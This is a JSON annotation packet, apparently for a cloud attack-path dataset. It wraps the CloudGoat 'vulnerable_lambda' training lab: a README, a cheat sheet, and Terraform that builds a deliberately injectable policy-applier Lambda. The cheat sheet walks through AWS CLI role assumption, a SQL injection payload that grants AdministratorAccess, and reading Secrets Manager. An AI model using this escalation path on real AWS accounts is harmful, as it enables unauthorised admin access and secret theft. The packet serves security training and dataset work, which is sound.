@@ -1,0 +1,160 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "ec5c0b24b7292522084391ee78937f5f2a7b67412e48866cdb4aa4cba3dd68cf",
+  "case_id": "cloudgoat:aws:vulnerable_lambda",
+  "role": "reviewer",
+  "annotator_id": "annotator_02",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudgoat",
+    "upstream_url": "https://github.com/RhinoSecurityLabs/cloudgoat",
+    "version_or_commit": "abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed",
+    "license": "BSD-3-Clause",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudgoat/abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/snapshot.zip",
+        "sha256": "6e93d9311b2497de5219fe388be6d16e2209c6b44c9457c9fc044c25f32a75cc"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudgoat:aws:vulnerable_lambda",
+    "kind": "executable_scenario",
+    "platform": "AWS",
+    "scenario": "vulnerable_lambda",
+    "manifest_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/manifest.yml",
+    "readme_paths": [
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/cheat_sheet.md"
+    ],
+    "terraform_file_count": 7,
+    "has_cheat_sheet": true,
+    "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/",
+    "review_score": 50,
+    "independence_group": "cloudgoat-scenario:vulnerable_lambda",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/README.md",
+      "member_sha256": "012573c4b42e34a399ffc677f1f30de2e00eca9fd0b2213f50ac62de9c87f36b",
+      "bytes": 1370,
+      "content_kind": "md",
+      "text": "\n# Scenario: vulnerable_lambda\n\n**Size:** Small\n\n**Difficulty:** Medium\n\n**Command:** `$ ./cloudgoat.py create vulnerable_lambda`\n\n## Scenario Resources\n\n- 1 IAM User\n- 1 IAM Role\n- 1 Lambda\n- 1 Secret\n\n## Scenario Start(s)\n\n1. IAM User 'bilbo'\n\n## Scenario Goal(s)\n\nFind the scenario's secret. (cg-secret-XXXXXX-XXXXXX)\n\n## Summary\n\nIn this scenario, you start as the 'bilbo' user. You will assume a role with more privileges, discover a \nlambda function that applies policies to users, and exploit a vulnerability in the function to escalate \nthe privileges of the bilbo user in order to search for secrets.\n\n## Exploitation Route(s)\n\n![Lucidchart Diagram](exploitation_route.png \"Exploitation Route\")\n\n\n## Walkthrough - IAM User \"bilbo\"\n\n1. Get permissions for the 'bilbo' user.\n2. List all roles.\n3. List lambdas to identify the target lambda.\n4. Look at the lambda source code.\n5. Assume the lambda invoker role.\n6. Craft an injection payload to send through the CLI.\n7. Base64 encode that payload. The single quote injection character is not compatible with the aws cli command otherwise.\n8. Invoke the policy applier lambda function, passing the name of the bilbo user and the injection payload.\n9. Now that Bilbo is an admin, use credentials for that user to list secrets from secretsmanager.\n\nA cheat sheet for this route is available [here](./cheat_sheet.md).\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/cheat_sheet.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/cheat_sheet.md",
+      "member_sha256": "2e8a35b123fbb249f97699cfa6461bbe1de7403afb5773da616ee66351717867",
+      "bytes": 4571,
+      "content_kind": "md",
+      "text": "## Step 1: Get Permissions for IAM User `bilbo`\nBefore anything else, check what permissions the `bilbo` user currently has.\n\n### Commands\n```bash\n# Get the ARN and full name of the current user\naws --profile bilbo --region us-east-1 sts get-caller-identity\n\n# List policies directly attached to the user (if any)\naws --profile bilbo --region us-east-1 iam list-user-policies --user-name bilbo\n\n# List all permissions assigned via a user policy\naws --profile bilbo --region us-east-1 iam get-user-policy --user-name bilbo --policy-name [your_policy_name]\n```\n### What This Does\n- The first command confirms that you're using the right AWS profile (`bilbo`).\n- The second command checks if there are any user-specific policies.\n- The third command retrieves details about a specific policy.\n\n---\n\n## Step 2: Find and Assume a Privileged Role\nThe next step is to list all roles in the AWS account and look for one that `bilbo` can assume.\n\n### Commands\n```bash\n# List all roles in the AWS account (filtering for CloudGoat roles)\naws --profile bilbo --region us-east-1 iam list-roles | grep cg-\n\n# Get all policies attached to the identified role\naws --profile bilbo --region us-east-1 iam list-role-policies --role-name [cg-target-role]\n\n# Assume the role that allows invoking Lambda functions\naws --profile bilbo --region us-east-1 sts assume-role --role-arn [cg-lambda-invoker_arn] --role-session-name assumed-role\n```\n\n### What This Does\n- Lists all roles, looking for ones associated with CloudGoat (`cg-`).\n- Checks what policies are attached to a promising role.\n- If the role is assumable, we assume it to gain higher privileges.\n\n---\n\n## Step 3: Identify the Target (Vulnerable) Lambda\nOnce you have assumed the Lambda-invoker role, list all available Lambda functions to find the vulnerable one.\n\n### Command\n```bash\n# List all Lambda functions\naws --profile assumed_role --region us-east-1 lambda list-functions\n```\n\n### What This Does\n- Retrieves all Lambda functions in the AWS account.\n- Identifies the one belonging to CloudGoat (it will likely start with `cg-`).\n- This Lambda can apply AWS policies to users—our attack target.\n\n---\n\n## Step 4: Examine the Lambda Function’s Code\nThe Lambda function contains source code that determines how it processes requests. We need to look at it for vulnerabilities.\n\n### Command\n```bash\n# Get detailed information about the vulnerable Lambda, including its source code package\naws --profile assumed_role --region us-east-1 lambda get-function --function-name [policy_applier_lambda_name]\n```\n\n### What This Does\n- Returns details about the function, including a **download URL** for its deployment package.\n- The package contains the Lambda function’s code.\n- Look for:\n  - **How it processes input** (is it properly sanitizing input?).\n  - **Any database structure hints** in the comments.\n  - **Potential injection vulnerabilities**.\n\n---\n\n## Step 5: Exploit the Lambda Function\nThe function is vulnerable to an injection attack. We can exploit this by crafting a malicious payload.\n\n### Steps\n1. Create a JSON file (`payload.json`) with a specially crafted policy name:\n   ```json\n   {\n       \"policy_names\": [\"AdministratorAccess' -- \"],\n       \"user_name\": \"[bilbo_user_name_here]\"\n   }\n   ```\n2. Use the AWS CLI to invoke the Lambda function with this payload.\n\n### Commands\n```bash\n# Send the injection payload to the Lambda function\naws --profile assumed_role --region us-east-1 lambda invoke --function-name [policy_applier_lambda_name] --cli-binary-format raw-in-base64-out --payload file://./payload.json out.txt\n\n# Check the output to confirm success\ncat out.txt\n```\n\n### What This Does\n- The JSON payload **injects an extra policy application command** by escaping a string.\n- The Lambda function grants `AdministratorAccess` to `bilbo`, making them an admin.\n\n---\n\n## Step 6: Use Admin Privileges to Retrieve the Secret\nNow that `bilbo` has admin rights, we can access AWS Secrets Manager to retrieve the stored secret.\n\n### Commands\n```bash\n# List all secrets stored in AWS Secrets Manager\naws --profile bilbo --region us-east-1 secretsmanager list-secrets\n\n# Retrieve the value of a specific secret\naws --profile bilbo --region us-east-1 secretsmanager get-secret-value --secret-id [ARN_OF_TARGET_SECRET]\n```\n\n### What This Does\n- The first command lists all available secrets.\n- The second command retrieves the actual secret value.\n\n---\n\n## Scenario Clean up\n- Do not forget to destroy the scenario so you do not get charged by AWS. \n  ```bash\n  ./cloudgoat.py destroy vulnerable_lambda\n  ```\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/manifest.yml",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/manifest.yml",
+      "member_sha256": "c37a60a54639a9f96220d1e9569ddb664febc98a2e421da8ee8288ab9b0cda89",
+      "bytes": 787,
+      "content_kind": "yml",
+      "text": "---\n  # The name of the scenario, alpha-numeric characters only, and underscore-separated\n- name: lambda_sql_injection\n  # The name of the author(s), comma separated\n- author: Dave Yesland, Mitch Fentz\n  # The version of the scenario, where major versions are breaking changes and minor are small fixes.\n- version: 1.0\n  # Text displayed to the user when they type \"{{ scenario_name }} help\"\n- help: |\n        In this scenario, you start as the 'bilbo' user. You will assume a role with more privelages, discover a \n        lambda function that applies policies to users, and exploit a vulnerability in the function to escelate \n        the privelages of the bilbo user. \n\n# Records the date upon which this scenario was last updated, in MM-DD-YYYY format\n- last-updated: 08-16-2021\n...\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/terraform/data_sources.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/terraform/data_sources.tf",
+      "member_sha256": "fff796a350236af519abe3bf0c09d33ec204f9c9b7122067d23c3b4e7c54873e",
+      "bytes": 56,
+      "content_kind": "tf",
+      "text": "#AWS Account Id\ndata \"aws_caller_identity\" \"current\" {}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/terraform/iam.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/terraform/iam.tf",
+      "member_sha256": "b04d1269d5ecf12ab38c75be1b197939e9233e1b9b866f06200dfa15d9c366fc",
+      "bytes": 2112,
+      "content_kind": "tf",
+      "text": "#IAM User\nresource \"aws_iam_user\" \"bilbo\" {\n  name          = \"cg-bilbo-${var.cgid}\"\n  force_destroy = true\n\n  tags = {\n    deployment_profile = var.profile\n  }\n\n  provisioner \"local-exec\" {\n    when    = destroy\n    command = \"./resource_cleaning.sh ${self.name} ${self.tags.deployment_profile}\"\n  }\n}\n\nresource \"aws_iam_access_key\" \"bilbo\" {\n  user = aws_iam_user.bilbo.name\n}\n\nresource \"aws_iam_user_policy\" \"standard_user\" {\n  name = \"${aws_iam_user.bilbo.name}-standard-user-assumer\"\n  user = aws_iam_user.bilbo.name\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Sid      = \"\"\n        Effect   = \"Allow\"\n        Action   = \"sts:AssumeRole\"\n        Resource = \"arn:aws:iam::940877411605:role/cg-lambda-invoker*\"\n      },\n      {\n        Sid    = \"\"\n        Effect = \"Allow\"\n        Action = [\n          \"iam:Get*\",\n          \"iam:List*\",\n          \"iam:SimulateCustomPolicy\",\n          \"iam:SimulatePrincipalPolicy\"\n        ]\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_role\" \"cg-lambda-invoker\" {\n  name = \"cg-lambda-invoker-${var.cgid}\"\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Effect = \"Allow\"\n        Sid    = \"\"\n        Principal = {\n          AWS = aws_iam_user.bilbo.arn\n        }\n      }\n    ]\n  })\n\n  inline_policy {\n    name = \"lambda-invoker\"\n\n    policy = jsonencode({\n      Version = \"2012-10-17\"\n      Statement = [\n        {\n          Effect = \"Allow\"\n          Action = [\n            \"lambda:ListFunctionEventInvokeConfigs\",\n            \"lambda:InvokeFunction\",\n            \"lambda:ListTags\",\n            \"lambda:GetFunction\",\n            \"lambda:GetPolicy\"\n          ]\n          Resource = aws_lambda_function.policy_applier_lambda1.arn\n        },\n        {\n          Effect = \"Allow\"\n          Action = [\n            \"lambda:ListFunctions\",\n            \"iam:Get*\",\n            \"iam:List*\",\n            \"iam:SimulateCustomPolicy\",\n            \"iam:SimulatePrincipalPolicy\"\n          ]\n          Resource = \"*\"\n        }\n      ]\n    })\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/terraform/lambda.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/terraform/lambda.tf",
+      "member_sha256": "05ccf976580ced505fac3128953f18c5eed5dbcea9f635cf21e50c138201e87c",
+      "bytes": 5457,
+      "content_kind": "tf",
+      "text": "# policy applier lambda 1 (vulnerable to sql injection)\nresource \"aws_iam_role\" \"policy_applier_lambda1\" {\n  name = \"${var.cgid}-policy_applier_lambda1\"\n\n  inline_policy {\n    name = \"policy_applier_lambda1\"\n\n    policy = jsonencode({\n      Version = \"2012-10-17\"\n      Statement = [\n        {\n          Action   = \"iam:AttachUserPolicy\"\n          Effect   = \"Allow\"\n          Resource = aws_iam_user.bilbo.arn\n        },\n        {\n          Effect = \"Allow\"\n          Action = [\n            \"logs:CreateLogStream\",\n            \"logs:PutLogEvents\"\n          ]\n          Resource = \"arn:aws:logs:${var.region}:${data.aws_caller_identity.current.account_id}:log-group:/aws/lambda/${var.cgid}-policy_applier_lambda1:*\"\n        }\n      ]\n    })\n  }\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Principal = {\n          Service = \"lambda.amazonaws.com\"\n        }\n        Effect = \"Allow\"\n        Sid    = \"\"\n      }\n    ]\n  })\n}\n\ndata \"archive_file\" \"policy_applier_lambda1_zip\" {\n  type        = \"zip\"\n  source_dir  = \"lambda_source_code/policy_applier_lambda1_src\"\n  output_path = \"lambda_source_code/archives/policy_applier_lambda1_src.zip\"\n}\n\nresource \"aws_cloudwatch_log_group\" \"policy_applier_lambda1\" {\n  name              = \"/aws/lambda/${var.cgid}-policy_applier_lambda1\"\n  retention_in_days = 14\n}\n\nresource \"aws_lambda_function\" \"policy_applier_lambda1\" {\n  depends_on = [\n    aws_cloudwatch_log_group.policy_applier_lambda1\n  ]\n\n  filename         = data.archive_file.policy_applier_lambda1_zip.output_path\n  function_name    = \"${var.cgid}-policy_applier_lambda1\"\n  role             = aws_iam_role.policy_applier_lambda1.arn\n  handler          = \"main.handler\"\n  description      = \"This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...\"\n  source_code_hash = filebase64sha256(data.archive_file.policy_applier_lambda1_zip.output_path)\n  runtime          = \"python3.9\"\n}\n\n# The below code is intended to be a second lambda that is also vulnerable to SQL injection.\n# The hope was to have a second exploit path that was more realistic, but there were issues while implementing \n# the injection concept. If it can be reworked/finished this would be a value add. \n# # policy applier lambda 2 (vulnerable to sql injection)\n# resource \"aws_iam_role\" \"policy_applier_lambda2\" {\n#   name = \"${var.cgid}-policy_applier_lambda2\"\n\n#   inline_policy {\n#     name = \"policy_applier_lambda2\"\n\n#     policy = jsonencode({\n#       Version = \"2012-10-17\"\n#       Statement = [\n#         {\n#           Action   = \"iam:AttachUserPolicy\"\n#           Effect   = \"Allow\"\n#           Resource = aws_iam_user.bilbo.arn\n#         },\n#         {\n#           Action   = \"s3:GetObject\"\n#           Effect   = \"Allow\"\n#           Resource = \"*\"\n#         },\n#         {\n#             \"Effect\": \"Allow\",\n#             \"Action\": \"logs:CreateLogGroup\",\n#             \"Resource\": \"arn:aws:logs:*:*:*\"\n#         },\n#         {\n#             \"Effect\": \"Allow\",\n#             \"Action\": [\n#                 \"logs:CreateLogStream\",\n#                 \"logs:PutLogEvents\"\n#             ],\n#             \"Resource\": [\n#                 \"arn:aws:logs:*:*:log-group:*:*\"\n#             ]\n#         }\n#       ]\n#     })\n#   }\n\n#   assume_role_policy = <<EOF\n# {\n#   \"Version\": \"2012-10-17\",\n#   \"Statement\": [\n#     {\n#       \"Action\": \"sts:AssumeRole\",\n#       \"Principal\": {\n#         \"Service\": \"lambda.amazonaws.com\"\n#       },\n#       \"Effect\": \"Allow\",\n#       \"Sid\": \"\"\n#     }\n#   ]\n# }\n# EOF\n# }\n\n# data \"archive_file\" \"policy_applier_lambda2_zip\" {\n#   type        = \"zip\"\n#   source_dir  = \"lambda_source_code/policy_applier_lambda2_src\"\n#   output_path = \"lambda_source_code/archives/policy_applier_lambda2_src.zip\"\n# }\n\n# resource \"aws_lambda_function\" \"policy_applier_lambda2\" {\n#   filename      = data.archive_file.policy_applier_lambda2_zip.output_path\n#   function_name = \"${var.cgid}-policy_applier_lambda2\"\n#   role          = aws_iam_role.policy_applier_lambda2.arn\n#   handler       = \"main.handler\"\n#   description   =  \"This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...\"\n#   source_code_hash = filebase64sha256(data.archive_file.policy_applier_lambda2_zip.output_path)\n#   runtime = \"python3.9\"\n# }\n\n# #invocation-target-lambda\n# resource \"aws_iam_role\" \"target_lambda\" {\n#   name = \"cg-${var.cgid}-target_lambda\"\n\n#   assume_role_policy = <<EOF\n# {\n#   \"Version\": \"2012-10-17\",\n#   \"Statement\": [\n#     {\n#       \"Action\": \"sts:AssumeRole\",\n#       \"Principal\": {\n#         \"Service\": \"lambda.amazonaws.com\"\n#       },\n#       \"Effect\": \"Allow\",\n#       \"Sid\": \"\"\n#     }\n#   ]\n# }\n# EOF\n# }\n\n# data \"archive_file\" \"target_lambda_zip\" {\n#     type        = \"zip\"\n#     source_dir  = \"lambda_source_code/target_lambda_src\"\n#     output_path = \"lambda_source_code/archives/target_lambda_src.zip\"\n# }\n\n# resource \"aws_lambda_function\" \"target_lambda\" {\n#   filename      = data.archive_file.target_lambda_zip.output_path\n#   function_name = \"cg-${var.cgid}-target_lambda\"\n#   role          = aws_iam_role.target_lambda.arn\n#   handler       = \"main.handler\"\n#   description   = \"Invoke this function correctly and you win this scenario.\"\n#   source_code_hash = filebase64sha256(data.archive_file.target_lambda_zip.output_path)\n#   runtime = \"python3.9\"\n# }\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/terraform/outputs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/terraform/outputs.tf",
+      "member_sha256": "537ae67407c4895b3fed52b0fa0a38aab0a0240498ac642f7ea6e75efa2ed89c",
+      "bytes": 431,
+      "content_kind": "tf",
+      "text": "#IAM User Credentials\noutput \"cloudgoat_output_bilbo_access_key_id\" {\n  value = aws_iam_access_key.bilbo.id\n}\n\noutput \"cloudgoat_output_bilbo_secret_key\" {\n  value     = aws_iam_access_key.bilbo.secret\n  sensitive = true\n}\n\n#AWS Account ID\noutput \"cloudgoat_output_aws_account_id\" {\n  value = data.aws_caller_identity.current.account_id\n}\n\noutput \"scenario_cg_id\" {\n  value = var.cgid\n}\n\noutput \"profile\" {\n  value = var.profile\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/terraform/provider.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/terraform/provider.tf",
+      "member_sha256": "663bd8873c243320d6ef864f4f05507424edc2642d0a343a07c164dbb1e74c56",
+      "bytes": 524,
+      "content_kind": "tf",
+      "text": "## This configures the minimum required Terraform and provider versions.\n## Configure the AWS profile and region specified in the variables as well as default tags.\n\nterraform {\n  required_version = \">= 1.5\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \">= 5.0.0\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  profile = var.profile\n  region  = var.region\n\n  default_tags {\n    tags = {\n      Name     = \"cg-${var.cgid}\"\n      Stack    = var.stack-name\n      Scenario = var.scenario-name\n    }\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/terraform/secretsmanager.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/terraform/secretsmanager.tf",
+      "member_sha256": "37a4643ed812a5ac96962614707b04cc4a7ec8c1d8a7526f058049e67913e298",
+      "bytes": 259,
+      "content_kind": "tf",
+      "text": "resource \"aws_secretsmanager_secret\" \"final_flag\" {\n  name = \"${var.cgid}-final_flag\"\n}\n\nresource \"aws_secretsmanager_secret_version\" \"final_flag_value\" {\n  secret_id     = aws_secretsmanager_secret.final_flag.id\n  secret_string = \"cg-secret-846237-284529\"\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/terraform/variables.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/vulnerable_lambda/terraform/variables.tf",
+      "member_sha256": "afed96318ec5be124a0b264037b4e4055c0d8ff8630f16c7746e24b62fb66927",
+      "bytes": 664,
+      "content_kind": "tf",
+      "text": "variable \"profile\" {\n  description = \"The AWS profile to use.\"\n  type        = string\n}\n\nvariable \"region\" {\n  description = \"The AWS region to deploy resources to.\"\n  default     = \"us-east-1\"\n  type        = string\n}\n\nvariable \"cgid\" {\n  description = \"CGID variable for unique naming.\"\n  type        = string\n}\n\nvariable \"cg_whitelist\" {\n  description = \"User's public IP address(es).\"\n  type        = list(string)\n}\n\nvariable \"stack-name\" {\n  description = \"Name of the stack.\"\n  default     = \"CloudGoat\"\n  type        = string\n}\n\nvariable \"scenario-name\" {\n  description = \"Name of the scenario.\"\n  default     = \"vulnerable-lambda\"\n  type        = string\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "cc947c7c03504d1d772fe2d4c9615f7ea8f87eaa54bac452ffcf7b944eae245c",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
